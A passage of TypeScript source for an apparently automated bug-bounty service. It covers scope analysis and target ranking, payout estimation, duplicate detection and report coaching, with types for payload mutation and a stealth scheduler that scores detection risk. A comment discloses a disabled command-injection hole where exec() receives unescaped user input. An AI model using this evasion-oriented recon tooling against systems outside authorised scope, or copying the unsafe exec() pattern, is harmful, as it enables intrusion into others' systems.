import { EventEmitter } from 'events';
import fs from 'fs/promises';
import path from 'path';
import { ProgramFetcher } from './program-fetcher';
import { CrossCampaignLearning } from './cross-campaign-learning';
import { ToolSynergyEngine } from './tool-synergy-engine';
import { FailurePredictionEngine } from './failure-prediction-engine';
import { PayoutOptimization } from './payout-optimization';
import { PredictiveDuplicateAvoidance } from './predictive-duplicate-avoidance';
import { TriagePredictor } from './triage-predictor';
export { ProgramFetcher } from './program-fetcher';
export type { ProgramConfig, ProgramScope, ScopeAsset, ProgramRules, ProgramDocumentation, FetchRecord, ChangeRecord, FetcherStatus, ProgramFetchStatus } from './program-fetcher';
export { CrossCampaignLearning } from './cross-campaign-learning';
export type { CampaignIndexEntry, SimilarCampaign, TechniqueRecommendation } from './cross-campaign-learning';
export { ToolSynergyEngine } from './tool-synergy-engine';
export type { SynergyScore, PlaybookSummary, PlaybookRecommendation, SynergyMap } from './tool-synergy-engine';
export { FailurePredictionEngine } from './failure-prediction-engine';
export type { ModelStats } from './failure-prediction-engine';
export { PayoutOptimization } from './payout-optimization';
export type { PayoutEstimateResult, EscalationChain, PayoutStats } from './payout-optimization';
export { PredictiveDuplicateAvoidance } from './predictive-duplicate-avoidance';
export type { HeatmapEntry, DuplicateOutcome } from './predictive-duplicate-avoidance';
export { TriagePredictor } from './triage-predictor';
export type { TriageDataPoint, ProgramTriageAverage, SubmissionTiming } from './triage-predictor';
export * from './intelligence-types';

// 2026-07-21 RCE stopgap (readiness pass, external-tool chokepoint work):
// reconSubdomains()/reconTechnologies() below shell out to subfinder/whatweb
// via exec() with the client-supplied `target` (POST /api/bounty-intelligence
// /pipeline/run's request body, stripped only by a naive protocol/path regex,
// never shell-escaped or validated). Disabled by default until Phase 1's
// execFile-based dispatchTool() chokepoint replaces these calls; the route
// handler also short-circuits before calling into this service at all.
function unsafeReconToolsEnabled(): boolean {
  return process.env.ALLOW_UNSAFE_SHELL_RECON_TOOLS === 'true';
}

// ============================================================
// Interfaces
// ============================================================

export interface Target {
  url: string;
  type: 'admin_panel' | 'api_endpoint' | 'auth_endpoint' | 'file_upload' | 'search' | 'payment' | 'general';
  priority: number;
  confidence: number;
  notes: string;
}

export interface ScopeAnalysis {
  domain: string;
  targets: Target[];
  subdomains: string[];
  attackSurface: {
    totalEndpoints: number;
    highValueTargets: number;
    authEndpoints: number;
    apiEndpoints: number;
    fileUploadEndpoints: number;
    adminPanels: number;
  };
  outOfScope: string[];
  recommendations: string[];
  confidence: number;
  analyzedAt: number;
}

export interface PayoutEstimate {
  severity: 'critical' | 'high' | 'medium' | 'low' | 'informational';
  cvssScore: number;
  estimatedMin: number;
  estimatedMax: number;
  estimatedMean: number;
  factors: PayoutFactor[];
  programMultiplier: number;
  confidence: number;
}

export interface PayoutFactor {
  name: string;
  impact: number;
  description: string;
}

export interface DuplicateCheckResult {
  isDuplicate: boolean;
  confidence: number;
  matchedFindings: MatchedFinding[];
  recommendation: 'submit' | 'skip' | 'differentiate';
  differentiationTips: string[];
}

export interface MatchedFinding {
  id: string;
  title: string;
  similarity: number;
  matchedOn: string[];
  reportDate: string;
}

export interface StoredFinding {
  id: string;
  title: string;
  endpoint: string;
  vulnerabilityType: string;
  severity: string;
  program: string;
  reportDate: string;
  status: 'accepted' | 'rejected' | 'duplicate' | 'pending';
}

export interface ReportCoachResult {
  overallScore: number;
  sections: ReportSection[];
  suggestions: string[];
  missingElements: string[];
  strengthAreas: string[];
  estimatedAcceptanceChance: number;
  confidence: number;
}

export interface ReportSection {
  name: string;
  score: number;
  maxScore: number;
  feedback: string;
}

export interface OrgMemoryEntry {
  program: string;
  data: ProgramKnowledge;
  updatedAt: number;
}

export interface ProgramKnowledge {
  pastSubmissions: SubmissionRecord[];
  acceptedPatterns: string[];
  rejectedPatterns: string[];
  preferences: Record<string, string>;
  technologyStack: string[];
  responseTime: number;
  averagePayout: number;
  notes: string[];
}

export interface SubmissionRecord {
  id: string;
  title: string;
  type: string;
  severity: string;
  status: 'accepted' | 'rejected' | 'duplicate' | 'pending';
  payout: number;
  submittedAt: number;
  resolvedAt?: number;
}

export interface PayloadMutationResult {
  original: string;
  category: 'xss' | 'sqli' | 'ssrf' | 'xxe' | 'ssti' | 'lfi' | 'rfi' | 'cmdi';
  variants: PayloadVariant[];
  totalVariants: number;
  confidence: number;
}

export interface PayloadVariant {
  payload: string;
  encoding: string;
  bypassTarget: string;
  evasionLevel: number;
  description: string;
}

export interface StealthPlan {
  windows: ActivityWindow[];
  optimalHours: number[];
  detectionRiskScore: number;
  requestsPerWindow: number;
  cooldownMinutes: number;
  totalDurationHours: number;
  recommendations: string[];
  confidence: number;
}

export interface ActivityWindow {
  start: string;
  end: string;
  maxRequests: number;
  riskLevel: 'low' | 'medium' | 'high';
  description: string;
}

export interface OptimizedSubmission {
  platform: 'hackerone' | 'bugcrowd' | 'intigriti' | 'synack' | 'yeswehack' | 'generic';
  formattedTitle: string;
  formattedBody: string;
  severity: string;
  cvssVector: string;
  cvssScore: number;
  platformSpecificFields: Record<string, any>;
  tags: string[];
  confidence: number;
}

export interface PostMortemAnalysis {
  totalSubmissions: number;
  acceptanceRate: number;
  byVulnType: Record<string, { total: number; accepted: number; rate: number }>;
  byProgram: Record<string, { total: number; accepted: number; rate: number; avgPayout: number }>;
  topPatterns: Pattern[];
  improvementAreas: string[];
  strengths: string[];
  confidence: number;
}

export interface Pattern {
  description: string;
  frequency: number;
  successRate: number;
  category: string;
}

export interface ReconResult {
  target: string;
  subdomains: SubdomainInfo[];
  technologies: TechnologyInfo[];
  endpoints: EndpointInfo[];
  vulnerabilitySurface: VulnerabilitySurface[];
  summary: string;
  confidence: number;
  reconDuration: number;
}

export interface SubdomainInfo {
  hostname: string;
  ip?: string;
  status?: number;
  title?: string;
}

export interface TechnologyInfo {
  name: string;
  version?: string;
  category: string;
  confidence: number;
}

export interface EndpointInfo {
  url: string;
  method: string;
  status?: number;
  contentType?: string;
  interesting: boolean;
  notes: string;
}

export interface VulnerabilitySurface {
  endpoint: string;
  potentialVulns: string[];
  riskLevel: 'critical' | 'high' | 'medium' | 'low';
  notes: string;
}

export interface AgentStatus {
  name: string;
  id: string;
  status: 'active' | 'idle' | 'error';
  lastRun: number | null;
  totalRuns: number;
  successRate: number;
}

export interface PipelineResult {
  target: string;
  program: string;
  stages: PipelineStage[];
  scopeAnalysis: ScopeAnalysis;
  reconResult: ReconResult;
  payloads: PayloadMutationResult[];
  duplicateChecks: DuplicateCheckResult[];
  submission: OptimizedSubmission;
  totalDuration: number;
  confidence: number;
}

export interface PipelineStage {
  name: string;
  status: 'pending' | 'running' | 'completed' | 'failed';
  startedAt?: number;
  completedAt?: number;
  error?: string;
}

// ============================================================
// BountyIntelligenceService
// ============================================================

export class BountyIntelligenceService extends EventEmitter {
  private storageDir = path.join(process.cwd(), 'workspace/bounty-intelligence');
  private agentStats: Map<string, { lastRun: number | null; totalRuns: number; successes: number }> = new Map();
  private knownFindings: StoredFinding[] = [];
  private findingsLoaded = false;
  public programFetcher: ProgramFetcher;
  public campaignLearning: CrossCampaignLearning;
  public toolSynergy: ToolSynergyEngine;
  public failurePrediction: FailurePredictionEngine;
  public payoutOptimization: PayoutOptimization;
  public duplicateAvoidance: PredictiveDuplicateAvoidance;
  public triagePredictor: TriagePredictor;

  constructor() {
    super();
    const agentIds = [
      'scope-analyzer', 'payout-scorer', 'duplicate-detector', 'report-coach',
      'org-memory', 'payload-mutator', 'stealth-scheduler', 'submission-optimizer',
      'post-mortem-learner', 'bounty-recon-agent',
      'campaign-learning', 'tool-synergy', 'failure-prediction', 'payout-optimization',
      'duplicate-avoidance', 'triage-predictor'
    ];
    for (const id of agentIds) {
      this.agentStats.set(id, { lastRun: null, totalRuns: 0, successes: 0 });
    }
    this.programFetcher = new ProgramFetcher();
    this.programFetcher.startAutoFetch();
    this.campaignLearning = new CrossCampaignLearning(this.storageDir);
    this.toolSynergy = new ToolSynergyEngine(this.storageDir);
    this.failurePrediction = new FailurePredictionEngine(this.storageDir);
    this.payoutOptimization = new PayoutOptimization(this.storageDir);
    this.duplicateAvoidance = new PredictiveDuplicateAvoidance(this.storageDir);
    this.triagePredictor = new TriagePredictor(this.storageDir);

    this.failurePrediction.setPayoutEstimator(async (technique: string, programId?: string) => {
      const estimate = await this.payoutOptimization.estimatePayout(programId || 'default', technique);
      return estimate.median;
    });
    this.failurePrediction.setDuplicateEstimator(async (technique: string, targetArea: string, programId?: string) => {
      const prediction = await this.duplicateAvoidance.predictDuplicate(programId || 'default', technique, targetArea);
      return prediction.duplicateProbability;
    });
  }

  private async ensureStorageDir(): Promise<void> {
    await fs.mkdir(this.storageDir, { recursive: true });
  }

  private async loadJson<T>(filename: string, fallback: T): Promise<T> {
    try {
      const filePath = path.join(this.storageDir, filename);
      const data = await fs.readFile(filePath, 'utf-8');
      return JSON.parse(data) as T;
    } catch {
      return fallback;
    }
  }

  private async saveJson(filename: string, data: any): Promise<void> {
    await this.ensureStorageDir();
    const filePath = path.join(this.storageDir, filename);
    await fs.writeFile(filePath, JSON.stringify(data, null, 2), 'utf-8');
  }

  private recordRun(agentId: string, success: boolean): void {
    const stats = this.agentStats.get(agentId);
    if (stats) {
      stats.lastRun = Date.now();
      stats.totalRuns++;
      if (success) stats.successes++;
    }
  }

  // ============================================================
  // 1. ScopeAnalyzer
  // ============================================================

  async analyzeScope(target: string, programInfo?: { outOfScope?: string[]; bountyRange?: string; programType?: string }): Promise<ScopeAnalysis> {
    this.emit('agent:start', { agent: 'scope-analyzer', target });

    const domain = target.replace(/^https?:\/\//, '').replace(/\/.*$/, '').replace(/^www\./, '');

    const storedPrograms = this.programFetcher.listPrograms();
    // Rank instead of taking the first array match — multiple programs can
    // share the same bare domain (e.g. hackerone.com/example vs
    // hackerone.com/security both resolve to "hackerone.com"), and picking
    // whichever was added to the store first previously meant a placeholder
    // demo program could win over the real one. Prefer, in order: an exact
    // handle match, an exact domain match, then among any remaining substring
    // matches the one fetched most recently (a live/maintained program is a
    // better bet than a stale one when the domain alone can't disambiguate).
    const candidates = storedPrograms
      .map(p => {
        const progDomain = p.url.replace(/^https?:\/\//, '').replace(/\/.*$/, '');
        let rank = -1;
        if (p.handle === domain) rank = 3;
        else if (progDomain === domain) rank = 2;
        else if (domain.includes(progDomain) || progDomain.includes(domain)) rank = 1;
        return { p, rank, lastFetched: this.programFetcher.getProgram(p.id)?.lastFetched ?? 0 };
      })
      .filter(c => c.rank >= 0)
      .sort((a, b) => b.rank - a.rank || b.lastFetched - a.lastFetched);

    const matchedProgram = candidates[0]?.p;

    if (matchedProgram) {
      const doc = this.programFetcher.getProgram(matchedProgram.id);
      // realDataFound gates this — a fetch that only produced the synthetic
      // fallback template must not be treated as an authoritative, high-
      // confidence scope for target selection; fall through to the generic
      // subdomain-guessing heuristic below instead, same as "no stored program".
      if (doc && doc.scope && doc.realDataFound) {
        const storedTargets: Target[] = doc.scope.inScope.map((asset, idx) => ({
          url: asset.identifier.startsWith('http') ? asset.identifier : `https://${asset.identifier}`,
          type: this.mapAssetType(asset.type),
          priority: asset.maxSeverity === 'critical' ? 10 : asset.maxSeverity === 'high' ? 8 : 6,
          confidence: 0.9,
          notes: asset.instruction || `In-scope ${asset.type} asset from ${matchedProgram.platform}`,
        }));
        storedTargets.sort((a, b) => b.priority - a.priority);

        const storedOutOfScope = doc.scope.outOfScope.map(a => a.identifier);

        const attackSurface = {
          totalEndpoints: storedTargets.length,
          highValueTargets: storedTargets.filter(t => t.priority >= 8).length,
          authEndpoints: storedTargets.filter(t => t.type === 'auth_endpoint').length,
          apiEndpoints: storedTargets.filter(t => t.type === 'api_endpoint').length,
          fileUploadEndpoints: storedTargets.filter(t => t.type === 'file_upload').length,
          adminPanels: storedTargets.filter(t => t.type === 'admin_panel').length,
        };

        const recommendations = this.generateScopeRecommendations(attackSurface);
        recommendations.unshift(`Using stored scope from ${matchedProgram.platform} program "${matchedProgram.name}" (last fetched: ${new Date(doc.lastFetched).toLocaleString()})`);

        const result: ScopeAnalysis = {
          domain,
          targets: storedTargets,
          subdomains: doc.scope.inScope.filter(a => a.type === 'wildcard' || a.type === 'domain').map(a => a.identifier),
          attackSurface,
          outOfScope: storedOutOfScope,
          recommendations,
          confidence: 0.9,
          analyzedAt: Date.now(),
        };

        this.recordRun('scope-analyzer', true);
        this.emit('agent:complete', { agent: 'scope-analyzer', result });
        return result;
      }
    }

    const commonSubdomains = [
      `www.${domain}`, `api.${domain}`, `admin.${domain}`, `app.${domain}`,
      `staging.${domain}`, `dev.${domain}`, `mail.${domain}`, `cdn.${domain}`,
      `auth.${domain}`, `login.${domain}`, `dashboard.${domain}`, `portal.${domain}`,
      `m.${domain}`, `mobile.${domain}`, `beta.${domain}`, `docs.${domain}`
    ];

    const highValuePaths = [
      { path: '/admin', type: 'admin_panel' as const, priority: 9 },
      { path: '/api/v1', type: 'api_endpoint' as const, priority: 8 },
      { path: '/api/v2', type: 'api_endpoint' as const, priority: 8 },
      { path: '/api/graphql', type: 'api_endpoint' as const, priority: 9 },
      { path: '/login', type: 'auth_endpoint' as const, priority: 8 },
      { path: '/register', type: 'auth_endpoint' as const, priority: 7 },
      { path: '/oauth', type: 'auth_endpoint' as const, priority: 9 },
      { path: '/oauth/callback', type: 'auth_endpoint' as const, priority: 9 },
      { path: '/reset-password', type: 'auth_endpoint' as const, priority: 8 },
      { path: '/upload', type: 'file_upload' as const, priority: 7 },
      { path: '/api/upload', type: 'file_upload' as const, priority: 8 },
      { path: '/search', type: 'search' as const, priority: 6 },
      { path: '/payment', type: 'payment' as const, priority: 9 },
      { path: '/checkout', type: 'payment' as const, priority: 9 },
      { path: '/api/users', type: 'api_endpoint' as const, priority: 8 },
      { path: '/api/admin', type: 'admin_panel' as const, priority: 10 },
      { path: '/settings', type: 'general' as const, priority: 5 },
      { path: '/profile', type: 'general' as const, priority: 5 },
      { path: '/webhook', type: 'api_endpoint' as const, priority: 7 },
      { path: '/.well-known', type: 'general' as const, priority: 4 },
    ];

    const targets: Target[] = highValuePaths.map(hp => ({
      url: `https://${domain}${hp.path}`,
      type: hp.type,
      priority: hp.priority,
      confidence: 0.6 + Math.random() * 0.3,
      notes: this.getTargetNotes(hp.type),
    }));

    targets.sort((a, b) => b.priority - a.priority);

    const outOfScope = programInfo?.outOfScope || [
      `*.${domain}/blog`,
      `support.${domain}`,
      'Third-party integrations',
    ];

    const attackSurface = {
      totalEndpoints: targets.length,
      highValueTargets: targets.filter(t => t.priority >= 8).length,
      authEndpoints: targets.filter(t => t.type === 'auth_endpoint').length,
      apiEndpoints: targets.filter(t => t.type === 'api_endpoint').length,
      fileUploadEndpoints: targets.filter(t => t.type === 'file_upload').length,
      adminPanels: targets.filter(t => t.type === 'admin_panel').length,
    };

    const recommendations = this.generateScopeRecommendations(attackSurface);

    const result: ScopeAnalysis = {
      domain,
      targets,
      subdomains: commonSubdomains,
      attackSurface,
      outOfScope,
      recommendations,
      confidence: 0.75,
      analyzedAt: Date.now(),
    };

    this.recordRun('scope-analyzer', true);
    this.emit('agent:complete', { agent: 'scope-analyzer', result });
    return result;
  }

  private mapAssetType(assetType: string): Target['type'] {
    const mapping: Record<string, Target['type']> = {
      url: 'general',
      domain: 'general',
      wildcard: 'general',
      api: 'api_endpoint',
      ios: 'general',
      android: 'general',
      hardware: 'general',
      other: 'general',
    };
    return mapping[assetType] || 'general';
  }

  private getTargetNotes(type: Target['type']): string {
    const notes: Record<string, string> = {
      admin_panel: 'Check for authentication bypass, IDOR, privilege escalation',
      api_endpoint: 'Test for broken authentication, mass assignment, rate limiting bypass',
      auth_endpoint: 'Test for credential stuffing, brute force, token leakage, OAuth misconfig',
      file_upload: 'Test for unrestricted upload, path traversal, SSRF via file fetch',
      search: 'Test for XSS, SQLi, LDAP injection in search parameters',
      payment: 'Test for price manipulation, race conditions, IDOR on transactions',
      general: 'Enumerate for information disclosure, misconfiguration',
    };
    return notes[type] || 'General testing recommended';
  }

  private generateScopeRecommendations(surface: ScopeAnalysis['attackSurface']): string[] {
    const recs: string[] = [];
    if (surface.adminPanels > 0) recs.push('Priority: Test admin panels for authentication bypass and privilege escalation');
    if (surface.apiEndpoints > 2) recs.push('Multiple API endpoints found - test for BOLA/IDOR across all resources');
    if (surface.authEndpoints > 1) recs.push('Multiple auth endpoints - check for inconsistent authentication enforcement');
    if (surface.fileUploadEndpoints > 0) recs.push('File upload detected - test for unrestricted file upload and path traversal');
    recs.push('Run subdomain enumeration to discover hidden assets');
    recs.push('Check for exposed .git, .env, backup files, and debug endpoints');
    recs.push('Test CORS configuration on all API endpoints');
    return recs;
  }

  // ============================================================
  // 2. PayoutScorer
  // ============================================================

  async estimatePayout(vulnerability: {
    type: string;
    severity?: string;
    cvssScore?: number;
    program?: string;
    hasProofOfConcept?: boolean;
    impactDescription?: string;
    isChained?: boolean;
  }): Promise<PayoutEstimate> {
    this.emit('agent:start', { agent: 'payout-scorer', vulnerability });

    const cvss = vulnerability.cvssScore || this.estimateCvssFromType(vulnerability.type, vulnerability.severity);
    const severity = this.cvssToSeverity(cvss);

    const payoutRanges: Record<string, [number, number]> = {
      critical: [5000, 15000],
      high: [2000, 5000],
      medium: [500, 2000],
      low: [100, 500],
      informational: [0, 100],
    };

    const [baseMin, baseMax] = payoutRanges[severity] || [0, 100];

    const factors: PayoutFactor[] = [];

    let multiplier = 1.0;

    const typeMultipliers: Record<string, number> = {
      rce: 1.5, ssrf: 1.3, sqli: 1.2, auth_bypass: 1.4, idor: 1.1,
      xss: 0.9, csrf: 0.8, open_redirect: 0.7, info_disclosure: 0.6,
      privilege_escalation: 1.4, account_takeover: 1.5, race_condition: 1.1,
    };

    const typeKey = vulnerability.type.toLowerCase().replace(/[\s-]/g, '_');
    if (typeMultipliers[typeKey]) {
      multiplier *= typeMultipliers[typeKey];
      factors.push({
        name: 'Vulnerability Type',
        impact: typeMultipliers[typeKey],
        description: `${vulnerability.type} has a ${typeMultipliers[typeKey] > 1 ? 'positive' : 'negative'} impact on payout`,
      });
    }

    if (vulnerability.hasProofOfConcept) {
      multiplier *= 1.2;
      factors.push({ name: 'Proof of Concept', impact: 1.2, description: 'Working PoC increases payout likelihood by 20%' });
    }

    if (vulnerability.isChained) {
      multiplier *= 1.3;
      factors.push({ name: 'Attack Chain', impact: 1.3, description: 'Chained vulnerabilities demonstrate higher impact' });
    }

    if (vulnerability.impactDescription && vulnerability.impactDescription.length > 200) {
      multiplier *= 1.1;
      factors.push({ name: 'Detailed Impact', impact: 1.1, description: 'Thorough impact description increases perceived value' });
    }

    const programMultiplier = this.getProgramMultiplier(vulnerability.program);
    multiplier *= programMultiplier;
    if (programMultiplier !== 1.0) {
      factors.push({ name: 'Program Reputation', impact: programMultiplier, description: `${vulnerability.program || 'Unknown'} program payout modifier` });
    }

    const estimatedMin = Math.round(baseMin * multiplier);
    const estimatedMax = Math.round(baseMax * multiplier);

    const result: PayoutEstimate = {
      severity,
      cvssScore: cvss,
      estimatedMin,
      estimatedMax,
      estimatedMean: Math.round((estimatedMin + estimatedMax) / 2),
      factors,
      programMultiplier,
      confidence: vulnerability.cvssScore ? 0.8 : 0.6,
    };

    this.recordRun('payout-scorer', true);
    this.emit('agent:complete', { agent: 'payout-scorer', result });
    return result;
  }

  private estimateCvssFromType(type: string, severity?: string): number {
    if (severity) {
      const severityScores: Record<string, number> = {
        critical: 9.5, high: 7.5, medium: 5.5, low: 3.0, informational: 1.0,
      };
      return severityScores[severity.toLowerCase()] || 5.0;
    }
    const typeScores: Record<string, number> = {
      rce: 9.8, ssrf: 8.5, sqli: 8.0, auth_bypass: 8.5, idor: 7.0,
      xss: 6.5, csrf: 5.5, open_redirect: 4.0, info_disclosure: 4.5,
      privilege_escalation: 8.5, account_takeover: 9.0, race_condition: 6.0,
      xxe: 7.5, ssti: 8.0, lfi: 7.0, path_traversal: 7.0, dos: 5.0,
    };
    const key = type.toLowerCase().replace(/[\s-]/g, '_');
    return typeScores[key] || 5.0;
  }

  private cvssToSeverity(cvss: number): 'critical' | 'high' | 'medium' | 'low' | 'informational' {
    if (cvss >= 9.0) return 'critical';
    if (cvss >= 7.0) return 'high';
    if (cvss >= 4.0) return 'medium';
    if (cvss >= 0.1) return 'low';
    return 'informational';
  }

  private getProgramMultiplier(program?: string): number {
    if (!program) return 1.0;
    const topPayers: Record<string, number> = {
      google: 1.5, microsoft: 1.4, apple: 1.6, facebook: 1.3, meta: 1.3,
      github: 1.2, shopify: 1.2, uber: 1.1, twitter: 1.0, x: 1.0,
      yahoo: 0.8, verizon: 0.9, att: 0.8, paypal: 1.2, stripe: 1.3,
    };
    const key = program.toLowerCase().replace(/[\s-]/g, '_');
    return topPayers[key] || 1.0;
  }

  // ============================================================
  // 3. DuplicateDetector
  // ============================================================

  async checkDuplicate(finding: {
    title: string;
    endpoint: string;
    vulnerabilityType: string;
    severity?: string;
    program?: string;
  }): Promise<DuplicateCheckResult> {
    this.emit('agent:start', { agent: 'duplicate-detector', finding });

    if (!this.findingsLoaded) {
      this.knownFindings = await this.loadJson<StoredFinding[]>('known-findings.json', []);
      this.findingsLoaded = true;
    }

    const matchedFindings: MatchedFinding[] = [];

    for (const known of this.knownFindings) {
      const matchedOn: string[] = [];
      let totalSimilarity = 0;
      let matchCount = 0;

      const titleSim = this.stringSimilarity(finding.title.toLowerCase(), known.title.toLowerCase());
      if (titleSim > 0.4) {
        matchedOn.push('title');
        totalSimilarity += titleSim;
        matchCount++;
      }

      const endpointSim = this.stringSimilarity(
        this.normalizeEndpoint(finding.endpoint),
        this.normalizeEndpoint(known.endpoint)
      );
      if (endpointSim > 0.6) {
        matchedOn.push('endpoint');
        totalSimilarity += endpointSim;
        matchCount++;
      }

      const typeSim = this.stringSimilarity(
        finding.vulnerabilityType.toLowerCase(),
        known.vulnerabilityType.toLowerCase()
      );
      if (typeSim > 0.7) {
        matchedOn.push('vulnerability_type');
        totalSimilarity += typeSim;
        matchCount++;
      }

      if (finding.program && known.program && finding.program.toLowerCase() === known.program.toLowerCase()) {
        matchedOn.push('program');
      }

      if (matchCount >= 2) {
        const similarity = totalSimilarity / matchCount;
        matchedFindings.push({
          id: known.id,
          title: known.title,
          similarity,
          matchedOn,
          reportDate: known.reportDate,
        });
      }
    }

    matchedFindings.sort((a, b) => b.similarity - a.similarity);

    const topMatch = matchedFindings[0];
    const isDuplicate = topMatch ? topMatch.similarity > 0.75 : false;
    const confidence = topMatch ? Math.min(topMatch.similarity + 0.1, 1.0) : 0.9;

    let recommendation: 'submit' | 'skip' | 'differentiate' = 'submit';
    const differentiationTips: string[] = [];

    if (isDuplicate) {
      recommendation = 'skip';
      differentiationTips.push('This finding closely matches an existing report');
      differentiationTips.push('Consider finding a different attack vector or deeper impact');
    } else if (topMatch && topMatch.similarity > 0.5) {
      recommendation = 'differentiate';
      differentiationTips.push('Similar finding exists - clearly highlight what makes yours unique');
      differentiationTips.push('Demonstrate different impact or attack path');
      differentiationTips.push('Include detailed PoC showing the distinct vulnerability');
      differentiationTips.push('Reference the similarity but explain the distinct security impact');
    }

    const result: DuplicateCheckResult = {
      isDuplicate,
      confidence,
      matchedFindings: matchedFindings.slice(0, 5),
      recommendation,
      differentiationTips,
    };

    this.recordRun('duplicate-detector', true);
    this.emit('agent:complete', { agent: 'duplicate-detector', result });
    return result;
  }

  async addKnownFinding(finding: StoredFinding): Promise<void> {
    if (!this.findingsLoaded) {
      this.knownFindings = await this.loadJson<StoredFinding[]>('known-findings.json', []);
      this.findingsLoaded = true;
    }
    this.knownFindings.push(finding);
    await this.saveJson('known-findings.json', this.knownFindings);
  }

  private normalizeEndpoint(endpoint: string): string {
    return endpoint
      .replace(/^https?:\/\//, '')
      .replace(/\?.*$/, '')
      .replace(/\/+$/, '')
      .replace(/\/\d+/g, '/:id')
      .toLowerCase();
  }

  private stringSimilarity(a: string, b: string): number {
    if (a === b) return 1.0;
    if (a.length === 0 || b.length === 0) return 0.0;

    const aTokens = a.split(/[\s\-_\/\.]+/).filter(Boolean);
    const bTokens = b.split(/[\s\-_\/\.]+/).filter(Boolean);
    const aSet = new Set(aTokens);
    const bSet = new Set(bTokens);

    if (aSet.size === 0 || bSet.size === 0) return 0.0;

    let intersection = 0;
    aTokens.forEach(token => {
      if (bSet.has(token)) intersection++;
    });

    const union = aSet.size + bSet.size - intersection;
    const jaccard = union > 0 ? intersection / union : 0;

    const maxLen = Math.max(a.length, b.length);
    let commonPrefix = 0;
    for (let i = 0; i < Math.min(a.length, b.length); i++) {
      if (a[i] === b[i]) commonPrefix++;
      else break;
    }
    const prefixScore = commonPrefix / maxLen;

    return jaccard * 0.7 + prefixScore * 0.3;
  }

  // ============================================================
  // 4. ReportCoach
  // ============================================================

  async coachReport(report: {
    title: string;
    description: string;
    stepsToReproduce?: string;
    impact?: string;
    severity?: string;
    cvssScore?: number;
    cvssVector?: string;
    proofOfConcept?: string;
    remediation?: string;
    references?: string[];
  }): Promise<ReportCoachResult> {
    this.emit('agent:start', { agent: 'report-coach', report: { title: report.title } });

    const sections: ReportSection[] = [];
    const suggestions: string[] = [];
    const missingElements: string[] = [];
    const strengthAreas: string[] = [];

    const titleScore = this.scoreTitle(report.title);
    sections.push({ name: 'Title', score: titleScore, maxScore: 10, feedback: this.getTitleFeedback(titleScore, report.title) });

    const descScore = this.scoreDescription(report.description);
    sections.push({ name: 'Description / Clarity', score: descScore, maxScore: 20, feedback: this.getDescriptionFeedback(descScore, report.description) });

    let stepsScore = 0;
    if (report.stepsToReproduce) {
      stepsScore = this.scoreSteps(report.stepsToReproduce);
      if (stepsScore >= 15) strengthAreas.push('Steps to reproduce are well-documented');
    } else {
      missingElements.push('Steps to reproduce');
      suggestions.push('Add clear, numbered steps to reproduce the vulnerability');
    }
    sections.push({ name: 'Steps to Reproduce', score: stepsScore, maxScore: 20, feedback: report.stepsToReproduce ? this.getStepsFeedback(stepsScore) : 'Missing - this is critical for report acceptance' });

    let pocScore = 0;
    if (report.proofOfConcept) {
      pocScore = this.scorePoc(report.proofOfConcept);
      if (pocScore >= 15) strengthAreas.push('Proof of Concept is comprehensive');
    } else {
      missingElements.push('Proof of Concept');
      suggestions.push('Include screenshots, HTTP requests/responses, or a working exploit script');
    }
    sections.push({ name: 'Proof of Concept', score: pocScore, maxScore: 20, feedback: report.proofOfConcept ? this.getPocFeedback(pocScore) : 'Missing - PoC significantly increases acceptance rate' });

    let impactScore = 0;
    if (report.impact) {
      impactScore = this.scoreImpact(report.impact);
      if (impactScore >= 12) strengthAreas.push('Impact description clearly articulates business risk');
    } else {
      missingElements.push('Impact description');
      suggestions.push('Describe the business impact: what data is at risk, who is affected, worst-case scenario');
    }
    sections.push({ name: 'Impact Description', score: impactScore, maxScore: 15, feedback: report.impact ? this.getImpactFeedback(impactScore) : 'Missing - clearly state the security impact' });

    let cvssScore = 0;
    if (report.cvssScore !== undefined && report.cvssVector) {
      cvssScore = this.scoreCvss(report.cvssScore, report.cvssVector, report.severity);
      if (cvssScore >= 8) strengthAreas.push('CVSS scoring is accurate');
    } else if (report.severity) {
      cvssScore = 3;
      suggestions.push('Include a CVSS vector string for more precise severity assessment');
    } else {
      missingElements.push('CVSS score / severity');
      suggestions.push('Add CVSS v3.1 vector and score to justify the severity rating');
    }
    sections.push({ name: 'CVSS Accuracy', score: cvssScore, maxScore: 10, feedback: this.getCvssFeedback(cvssScore) });

    let remediationScore = 0;
    if (report.remediation) {
      remediationScore = this.scoreRemediation(report.remediation);
    } else {
      missingElements.push('Remediation suggestion');
      suggestions.push('Suggest specific remediation steps - this shows expertise and helps the program');
    }
    sections.push({ name: 'Remediation', score: remediationScore, maxScore: 5, feedback: report.remediation ? 'Remediation suggestion provided' : 'Missing - optional but recommended' });

    const overallScore = sections.reduce((sum, s) => sum + s.score, 0);
    const maxTotal = sections.reduce((sum, s) => sum + s.maxScore, 0);
    const normalizedScore = Math.round((overallScore / maxTotal) * 100);

    if (report.title.length < 20) suggestions.push('Make the title more descriptive (include vuln type, affected component, and impact)');
    if (!report.references || report.references.length === 0) suggestions.push('Add references (CWE IDs, OWASP links, similar CVEs) to strengthen the report');
    if (report.description.length < 100) suggestions.push('Expand the description to provide more technical context');

    const estimatedAcceptanceChance = Math.min(
      0.95,
      Math.max(0.05, normalizedScore / 100 - (missingElements.length * 0.1))
    );

    const result: ReportCoachResult = {
      overallScore: normalizedScore,
      sections,
      suggestions,
      missingElements,
      strengthAreas,
      estimatedAcceptanceChance,
      confidence: 0.7,
    };

    this.recordRun('report-coach', true);
    this.emit('agent:complete', { agent: 'report-coach', result });
    return result;
  }

  private scoreTitle(title: string): number {
    let score = 0;
    if (title.length >= 10) score += 2;
    if (title.length >= 30) score += 2;
    if (/\b(xss|sqli|ssrf|idor|rce|csrf|xxe|lfi|ssti)\b/i.test(title)) score += 2;
    if (/\b(in|on|at|via)\b/i.test(title)) score += 1;
    if (/\b(allows|leads|enables|results)\b/i.test(title)) score += 2;
    if (title.includes(' - ') || title.includes(': ')) score += 1;
    return Math.min(score, 10);
  }

  private getTitleFeedback(score: number, title: string): string {
    if (score >= 8) return 'Excellent title - clear, descriptive, and follows best practices';
    if (score >= 5) return 'Good title, but could be more descriptive. Include vulnerability type + component + impact.';
    return 'Title needs improvement. Use format: "[Vuln Type] in [Component] allows [Impact]"';
  }

  private scoreDescription(desc: string): number {
    let score = 0;
    if (desc.length >= 50) score += 3;
    if (desc.length >= 150) score += 3;
    if (desc.length >= 300) score += 2;
    if (/\b(request|response|parameter|endpoint|header|cookie|token)\b/i.test(desc)) score += 3;
    if (/```[\s\S]*?```/.test(desc) || /\bHTTP\/\d/i.test(desc)) score += 3;
    if (/\b(attacker|malicious|unauthorized)\b/i.test(desc)) score += 2;
